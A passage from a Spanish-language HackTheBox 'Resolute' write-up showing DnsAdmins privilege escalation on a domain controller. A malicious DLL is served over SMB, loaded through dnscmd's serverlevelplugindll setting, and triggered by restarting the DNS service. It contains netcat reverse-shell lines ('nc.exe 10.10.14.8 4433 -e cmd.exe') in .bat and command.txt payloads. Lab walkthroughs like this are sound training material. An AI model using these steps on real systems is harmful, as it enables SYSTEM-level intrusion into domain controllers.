+<p>Peeerfecto, no hay errores y se nos generó el archivo <code>Win32Project1.dll</code>, así que lo siguiente es movernos la librería (<code>DLL</code>) a nuestro sistema para posteriormente jugar con <strong>SMB</strong>, <code>tcpdump</code> para estar escuchando por si llegan paquetes <code>ICMP</code> (recordemos que <code>ping</code> envía ese tipo de paquetes), <strong>dnscmd</strong> para agregar el plugin y el reinicio del servidor <strong>DNS</strong>:</p>
+
+<p>Ejecutamos:</p>
+
+<pre><code class="language-bash">❱ file Win32Project1.dll 
+Win32Project1.dll: PE32+ executable (DLL) (GUI) x86-64, for MS Windows
+❱ smbserver.py smbFolder $(pwd) -smb2support
+❱ tcpdump -i tun0 icmp
+</code></pre>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\&gt; dnscmd /config /serverlevelplugindll \\10.10.14.8\smbFolder\Win32Project1.dll
+*Evil-WinRM* PS C:\&gt; sc.exe stop dns
+*Evil-WinRM* PS C:\&gt; sc.exe start dns
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_tcpdump_ICMP_RCEdone.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>VAAAAAaaaaAAmo0000000000000oo nos llega la traza <code>ICMP</code>, por lo taaaaaaaaaaaaaaaaanto, el servidor <strong>DNS</strong> esta ejecutando nuestro plugin y por lo consiguiente nuestro plugin ejecuta el <code>ping</code> (((((:</p>
+
+<p>AHORAAAAAAAAAA!! Digámosle que nos genere una <strong>reverse Shell</strong>, pero en lugar de pasarle el binario pasémosle un archivo <code>.bat</code> que será el que contenga toooooooodos los comandos que queremos ejecutar, en nuestro caso el llamado al <code>nc.exe</code> o a un binario generado con <code>msfvenom</code>.</p>
+
+<p>El archivo <code>.cpp</code> quedaría así:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220win_VS_win32projCPP_systemBAT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Y en nuestro sistema creamos el objeto <code>hola.bat</code> con el llamado al binario <code>nc.exe</code> que también estaremos compartiendo en la misma carpeta <code>smbFolder</code>:</p>
+
+<pre><code class="language-bash">❱ cat hola.bat
+\\10.10.14.8\smbFolder\nc.exe 10.10.14.8 4433 -e cmd.exe
+</code></pre>
+
+<p>Lo subimos a la máquina y nos ponemos en escucha:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+</code></pre>
+
+<p>Hacemos todo lo de antes yyyyyyyyy en nuestro listeneeeeeeeeeeeeer:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_SYSTEMrevSH_dnsEXEpersistance.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Increibleeeeeeeeeeeeeee!! Cualquier comando que quisiéramos ejecutar lo pondríamos dentro de <code>hola.bat</code> y ya tendríamos RCE como diosito. Veamos rápidamente la otra manera…</p>
+
+<p>…</p>
+
+<h2 id="repo-dnsadmin-dll">Generamos la <u>DLL</u> usando <u>DNSAdmin-DLL</u> <a href="#repo-dnsadmin-dll">📌</a></h2>
+
+<p>▶️ <a href="https://github.com/kazkansouh/DNSAdmin-DLL">https://github.com/kazkansouh/DNSAdmin-DLL</a>.</p>
+
+<p>Este recurso es mucho más sencillo, él simplemente busca un archivo llamado <code>command.txt</code> en la ruta <code>C:\Windows\Temp</code>, parsea su información y cada línea la toma como comandos que serán ejecutados por la instrucción <code>system()</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220win_VS_DNSAdmin_DLL_commandTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Po listo, no tenemos que cambiar nada del proyecto, compilamos de la misma forma que antes y nos genera la librería <code>DNSAdmin-DLL.dll</code>.</p>
+
+<pre><code class="language-c++">1&gt;------ Operación Recompilar todo iniciada: proyecto: DNSAdmin-DLL, configuración: Release x64 ------
+1&gt;stdafx.cpp
+1&gt;dllmain.cpp
+1&gt;DNSAdmin-DLL.cpp
+1&gt;   Creando biblioteca C:\DNSAdmin-DLL\DNSAdmin-DLL\x64\Release\DNSAdmin-DLL.lib y objeto C:\DNSAdmin-DLL\DNSAdmin-DLL\x64\Release\DNSAdmin-DLL.exp
+1&gt;Generando código
+1&gt;Previous IPDB not found, fall back to full compilation.
+1&gt;All 4 functions were compiled because no usable IPDB/IOBJ from previous compilation was found.
+1&gt;Generación de código finalizada
+1&gt;DNSAdmin-DLL.vcxproj -&gt; C:\DNSAdmin-DLL\DNSAdmin-DLL\x64\Release\DNSAdmin-DLL.dll
+========== Recompilar todo: 1 correctos, 0 incorrectos, 0 omitidos ==========
+</code></pre>
+
+<p>Generamos el archivo <code>command.txt</code> de nuevo con la reverse shell generada con <strong>nc</strong>, pero para cambiar, ponemos el puerto <code>4434</code> (a ver que e.e):</p>
+
+<pre><code class="language-bash">❱ cat command.txt 
+\\10.10.14.8\smbFolder\nc.exe 10.10.14.8 4434 -e cmd.exe
+</code></pre>
+
+<p>Subimos a la ruta <code>C:\Windows\Temp</code> y nos ponemos en escucha por el puerto <code>4434</code>, ahora ejecutamos:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Windows\Temp&gt; dnscmd /config /serverlevelplugindll \\10.10.14.8\smbFolder\DNSAdmin-DLL.dll
+*Evil-WinRM* PS C:\Windows\Temp&gt; sc.exe stop dns
+*Evil-WinRM* PS C:\Windows\Temp&gt; sc.exe start dns
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_SYSTEMrevSH_DNSAdminDLL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Y LISTOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220google_gif_girlPChappy.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;" /></p>
+
+<p>También obtenemos la reverse shell (: Así que tenemos 3 opciones, personalmente me gusta la segunda, ya que es muuuuuuuuuy sencilla de leer y saber que estamos haciendo.</p>
+
+<p>Así que ahora si, nos vimoooooooooooooooooos…</p>
+
+<p>…</p>
+
+<p>¡Muy linda máquina eh! Me dan un poco de cosa los <strong>DC</strong>s, pero esta me quito muuuuuuuuuucho del “miedo” ante ellas, la escalada es brutal.</p>
+
+<p>Bueeeeeno, hasta acá nos leemos 😥 cuídate y como sieeeempreeeeee: A R O M P E R T O D O ! ! !</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Resolute&url=http://localhost:4000/htb/resolute" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#DC">DC</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#DLL">DLL</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#DnsAdmins">DnsAdmins</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#LDAP">LDAP</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#PSTranscript">PSTranscript</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#visual-studio">visual-studio</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/active">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/active/148banner.png" alt="HackTheBox - Active"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/active">HackTheBox - Active</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio, de cabeza contra un Domain Controller, jugaremos mucho con SMB y sus carpetas compartidas, movimientos SYStematicos y VOLtaicos e.e, bastante crackeo de contraseñas y obtención de...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">16 May 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/sharp">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/sharp/303banner.png" alt="HackTheBox - Sharp"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/sharp">HackTheBox - Sharp</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel difícil, vamos a movernos entre carpetas compartidas, organizaremos nuestras ideas con Kanban (🤪) y jugaremos con binarios .exe para aprovechar deserializaciones y errores de configuración.
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">01 May 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/fuse">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/fuse/bannerfuse.png" alt="HackTheBox - Fuse"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/fuse">HackTheBox - Fuse</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel medio. Usaremos varios usuarios como diccionario para encontrar uno valido en el sistema, estando dentro explotaremos un permiso que nos deja subir drivers, subiremos uno conocido que...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">31 Oct 2020</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+                
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
